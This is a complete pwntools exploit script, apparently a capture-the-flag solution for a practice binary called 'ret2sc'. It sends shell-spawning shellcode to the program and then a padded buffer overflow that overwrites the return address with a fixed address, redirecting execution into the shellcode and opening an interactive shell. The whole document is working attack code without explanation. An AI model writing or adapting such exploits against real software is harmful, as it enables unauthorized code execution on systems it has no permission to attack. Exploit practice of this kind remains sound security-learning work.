from pwn import *
context(arch = 'amd64', os = 'linux')
r = process("./ret2sc")
r.recvuntil(": ")
r.send(asm(shellcraft.sh()))
r.recvuntil(": ")
shellcode = "S"*0x18+p64(0x601060)
r.send(shellcode)
r.interactive()
